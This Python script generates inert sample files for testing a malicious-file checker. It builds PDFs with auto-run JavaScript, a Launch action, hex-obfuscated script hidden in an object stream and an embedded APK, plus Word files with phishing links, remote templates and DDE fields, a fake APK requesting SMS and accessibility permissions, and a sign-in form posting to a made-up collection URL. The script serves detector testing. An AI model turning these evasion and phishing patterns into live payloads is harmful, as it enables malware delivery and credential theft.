"""Harmless test files for the file checker: for the tests, and to show it on the Pi's page or
by sharing them to the app.

    python scripts/make_file_samples.py ~/ps3-file-samples

None of them can do anything. The "apps" are zip files with a made-up manifest and no code,
which Android refuses to install. The "JavaScript" only shows a message box, the "launch"
names a program that does not exist, the "macro" is a placeholder without code, the links
and the template point to made-up websites, and the sign-in page sends nowhere. They carry
exactly the signs a harmful file would, which is what the checker looks for.
"""
import io
import os
import struct
import sys
import zipfile
import zlib

PHISHING_LINK = b"http://sbi-kyc-update-ps3lab.xyz/login"
SAFE_LINK = b"https://www.irctc.co.in/nget/train-search"


def pdf(extra_catalog=b"", annots=b"", extra_objs=(), text=b"PS3 Guardian test file: an ordinary ticket"):
    content = b"BT /F1 16 Tf 72 720 Td (" + text + b") Tj ET"
    objs = [b"<< /Type /Catalog /Pages 2 0 R" + extra_catalog + b" >>",
            b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
            b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 5 0 R >> >> "
            b"/Contents 4 0 R" + annots + b" >>",
            b"<< /Length %d >>\nstream\n" % len(content) + content + b"\nendstream",
            b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>"] + list(extra_objs)
    out = b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n"
    offsets = []
    for i, body in enumerate(objs, 1):
        offsets.append(len(out))
        out += b"%d 0 obj\n" % i + body + b"\nendobj\n"
    xref = len(out)
    out += b"xref\n0 %d\n0000000000 65535 f \n" % (len(objs) + 1)
    out += b"".join(b"%010d 00000 n \n" % o for o in offsets)
    out += b"trailer\n<< /Size %d /Root 1 0 R >>\nstartxref\n%d\n%%%%EOF\n" % (len(objs) + 1, xref)
    return out


def pdf_with_link(url=PHISHING_LINK):
    return pdf(annots=b" /Annots [6 0 R]", text=b"Your KYC is pending. Click here to update it.",
               extra_objs=[b"<< /Type /Annot /Subtype /Link /Rect [72 700 400 730] /Border [0 0 0] "
                           b"/A << /S /URI /URI (" + url + b") >> >>"])


def pdf_autorun_js():
    return pdf(extra_catalog=b" /OpenAction 6 0 R",
               extra_objs=[b"<< /Type /Action /S /JavaScript /JS (app.alert\\('PS3 Guardian test file: harmless'\\);) >>"])


def pdf_launch():
    return pdf(extra_catalog=b" /OpenAction 6 0 R",
               extra_objs=[b"<< /Type /Action /S /Launch /F (ps3-guardian-test-does-not-exist.exe) >>"])


def pdf_hidden_js():
    """The code is in a compressed object stream, and its name is written as /J#61vaScript."""
    inner = zlib.compress(b"7 0 << /S /J#61vaScript /JS (app.alert\\('PS3 Guardian test'\\)) >>")
    return pdf(extra_catalog=b" /OpenAction 7 0 R",
               extra_objs=[b"<< /Type /ObjStm /N 1 /First 4 /Filter /FlateDecode /Length %d >>\nstream\n" % len(inner)
                           + inner + b"\nendstream"])


def pdf_embedded_app():
    return pdf(extra_catalog=b" /Names << /EmbeddedFiles << /Names [(card) 6 0 R] >> >>",
               extra_objs=[b"<< /Type /Filespec /F (Wedding_Invitation.apk) /UF (Wedding_Invitation.apk) "
                           b"/EF << /F 7 0 R >> >>",
                           b"<< /Type /EmbeddedFile /Length 4 >>\nstream\ntest\nendstream"])


_W = b'xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"'
_R = b"http://schemas.openxmlformats.org/officeDocument/2006/relationships"
_HEAD = b'<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'


def docx(text=b"PS3 Guardian test file: an ordinary letter", hyperlink=None, macro=False, template=None, dde=False):
    body = b"<w:p><w:r><w:t>" + text + b"</w:t></w:r></w:p>"
    if dde:
        body += (b'<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText xml:space="preserve"> '
                 b'DDEAUTO "ps3-guardian-test" </w:instrText></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>')
    files = {
        "[Content_Types].xml": _HEAD + b'<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
        b'<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
        b'<Default Extension="xml" ContentType="application/xml"/><Override PartName="/word/document.xml" '
        b'ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>',
        "_rels/.rels": _HEAD + b'<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
        b'<Relationship Id="rId1" Type="' + _R + b'/officeDocument" Target="word/document.xml"/></Relationships>',
        "word/document.xml": _HEAD + b"<w:document " + _W + b"><w:body>" + body + b"</w:body></w:document>",
    }
    rels = b""
    if hyperlink:
        rels += (b'<Relationship Id="rId5" Type="' + _R + b'/hyperlink" Target="' + hyperlink
                 + b'" TargetMode="External"/>')
    files["word/_rels/document.xml.rels"] = (_HEAD + b'<Relationships xmlns="http://schemas.openxmlformats.org/'
                                             b'package/2006/relationships">' + rels + b"</Relationships>")
    if macro:
        files["word/vbaProject.bin"] = b"PS3 Guardian test placeholder: no macro code in here"
    if template:
        files["word/settings.xml"] = _HEAD + b"<w:settings " + _W + b' xmlns:r="' + _R + b'">' \
            b'<w:attachedTemplate r:id="rId1"/></w:settings>'
        files["word/_rels/settings.xml.rels"] = (
            _HEAD + b'<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
            b'<Relationship Id="rId1" Type="' + _R + b'/attachedTemplate" Target="' + template
            + b'" TargetMode="External"/></Relationships>')
    return _zip(files)


def _axml(strings):
    """A minimal binary Android manifest: the XML header and a UTF-16 string pool."""
    data, offsets = b"", []
    for s in strings:
        offsets.append(len(data))
        data += struct.pack("<H", len(s)) + s.encode("utf-16-le") + b"\x00\x00"
    while len(data) % 4:
        data += b"\x00"
    start = 28 + 4 * len(strings)
    pool = struct.pack("<HHIIIIII", 0x0001, 28, start + len(data), len(strings), 0, 0, start, 0)
    pool += b"".join(struct.pack("<I", o) for o in offsets) + data
    return struct.pack("<HHI", 0x0003, 8, 8 + len(pool)) + pool


def fake_apk():
    manifest = _axml(["manifest", "package", "com.example.ps3test.invitation", "uses-permission", "name",
                      "android.permission.READ_SMS", "android.permission.RECEIVE_SMS",
                      "android.permission.READ_CONTACTS", "android.permission.BIND_ACCESSIBILITY_SERVICE",
                      "android.permission.INTERNET"])
    return _zip({"AndroidManifest.xml": manifest, "classes.dex": b"dex\n035\x00" + b"\x00" * 104,
                 "res/raw/readme.txt": b"PS3 Guardian test file: not a real app, it cannot be installed"})


def fake_exe():
    return b"MZ" + b"\x00" * 58 + struct.pack("<I", 64) + b"PE\x00\x00" + b"PS3 Guardian test file: not a real program"


def login_page():
    return (b"<!doctype html><html><head><title>Sign in</title></head><body><h1>PS3 Guardian test page</h1>"
            b'<form action="http://ps3lab-login.example/collect" method="post"><input name="user">'
            b'<input type="password" name="pin"><button>Sign in</button></form></body></html>')


def png():
    def chunk(kind, body):
        return struct.pack(">I", len(body)) + kind + body + struct.pack(">I", zlib.crc32(kind + body) & 0xFFFFFFFF)
    raw = zlib.compress(b"\x00\xff\xff\xff")
    return (b"\x89PNG\r\n\x1a\n" + chunk(b"IHDR", struct.pack(">IIBBBBB", 1, 1, 8, 2, 0, 0, 0))[:-4]
            + struct.pack(">I", zlib.crc32(b"IHDR" + struct.pack(">IIBBBBB", 1, 1, 8, 2, 0, 0, 0)) & 0xFFFFFFFF)
            + chunk(b"IDAT", raw) + chunk(b"IEND", b""))


def _zip(files):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        for name, data in files.items():
            z.writestr(name, data)
    return buf.getvalue()


def samples():
    """{file name: (data, what the checker should say)}"""
    apk = fake_apk()
    return {
        "ps3-test-ticket.pdf": (pdf(), "safe"),
        "ps3-test-train-link.pdf": (pdf_with_link(SAFE_LINK), "safe"),
        "ps3-test-letter.docx": (docx(), "safe"),
        "ps3-test-photo.png": (png(), "safe"),
        "ps3-test-kyc-link.pdf": (pdf_with_link(), "dangerous"),
        "ps3-test-kyc-letter.docx": (docx(text=b"Update your KYC today", hyperlink=PHISHING_LINK), "dangerous"),
        "ps3-test-autorun.pdf": (pdf_autorun_js(), "dangerous"),
        "ps3-test-launch.pdf": (pdf_launch(), "dangerous"),
        "ps3-test-hidden-code.pdf": (pdf_hidden_js(), "dangerous"),
        "ps3-test-attachment.pdf": (pdf_embedded_app(), "dangerous"),
        "ps3-test-macro.docm": (docx(macro=True), "dangerous"),
        "ps3-test-remote-template.docx": (docx(template=b"http://ps3lab-template.example/t.dotm"), "dangerous"),
        "ps3-test-dde.docx": (docx(dde=True), "dangerous"),
        "Wedding_Invitation.apk": (apk, "dangerous"),
        "Wedding_Invitation.pdf": (apk, "dangerous"),
        "Wedding_Card.pdf.apk": (apk, "dangerous"),
        "ps3-test-photos.zip": (_zip({"photo1.png": png(), "Wedding_Invitation.apk": apk}), "dangerous"),
        "ps3-test-setup.exe": (fake_exe(), "dangerous"),
        "ps3-test-login.html": (login_page(), "dangerous"),
    }


def main():
    out = os.path.expanduser(sys.argv[1] if len(sys.argv) > 1 else "ps3-file-samples")
    os.makedirs(out, exist_ok=True)
    for name, (data, expect) in samples().items():
        with open(os.path.join(out, name), "wb") as f:
            f.write(data)
        print(f"{expect:9s}  {name}")
    print(f"\n{len(samples())} harmless test files in {out}. Check them with: python scripts/check_files.py {out}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
